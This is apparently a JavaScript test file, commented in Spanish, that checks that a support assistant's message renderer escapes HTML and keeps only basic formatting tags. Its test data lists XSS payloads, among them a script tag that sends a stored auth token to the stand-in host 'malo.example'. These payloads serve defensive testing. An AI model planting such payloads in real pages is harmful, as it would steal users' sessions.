// tests/formato-mensaje.test.js — el HTML del asistente de soporte se escapa antes de dar formato (frontend/src/lib/formatoMensaje.js)
'use strict';
const path = require('path');
const { pathToFileURL } = require('url');

function assert(c, m) { if (!c) throw new Error('FAIL: ' + m); console.log('  ✅ ' + m); }
const lib = (f) => import(pathToFileURL(path.join(__dirname, '..', '..', 'frontend', 'src', 'lib', f)).href);

// Etiquetas HTML que quedan "vivas" en la salida (las únicas permitidas son strong, em, code y br)
const etiquetas = (html) => [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)].map((m) => m[1].toLowerCase());

(async () => {
  console.log('\n[formato-mensaje] Tests:');
  const { renderMensaje, escaparHtml } = await lib('formatoMensaje.js');

  assert(escaparHtml('<a href="x" onclick=\'y\'>&</a>') === '&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;&lt;/a&gt;', 'escapa < > & y comillas');
  assert(escaparHtml(undefined) === '' && escaparHtml(null) === '' && escaparHtml(12) === '12', 'acepta vacío y números sin romper');

  const xss = [
    '<img src=x onerror=alert(1)>',
    '<script>fetch("https://malo.example/?t="+localStorage.akira_token)</script>',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '**<img src=x onerror=alert(1)>**',
    '`<b onmouseover=alert(1)>x</b>`',
    '*<a href="javascript:alert(1)">clic</a>*',
    '"><img src=x onerror=alert(1)>',
  ];
  for (const t of xss) {
    const html = renderMensaje(t);
    const vivas = etiquetas(html).filter((e) => !['strong', 'em', 'code', 'br'].includes(e));
    assert(vivas.length === 0, `inerte: ${t.slice(0, 40)}`);
    assert(!/<img|<script|<svg|<iframe|<a\s/i.test(html), `sin etiquetas peligrosas en la salida: ${t.slice(0, 30)}`);
  }
  assert(renderMensaje('<img src=x onerror=alert(1)>') === '&lt;img src=x onerror=alert(1)&gt;', 'el ejemplo clásico queda como texto visible');

  // El formato simple sigue funcionando
  assert(renderMensaje('Hola **Akira**') === 'Hola <strong>Akira</strong>', 'negrita');
  assert(renderMensaje('esto es *importante*') === 'esto es <em>importante</em>', 'cursiva');
  assert(/^<code style="[^"]*">npm start<\/code>$/.test(renderMensaje('`npm start`')), 'código');
  assert(renderMensaje('uno\ndos\r\ntres') === 'uno<br/>dos<br/>tres', 'saltos de línea');
  assert(renderMensaje('Precio: 5 < 10 & 10 > 5') === 'Precio: 5 &lt; 10 &amp; 10 &gt; 5', 'texto normal con símbolos se muestra bien');
  console.log('✅ formato-mensaje: OK');
})().catch((e) => { console.error(e.message); process.exit(1); });
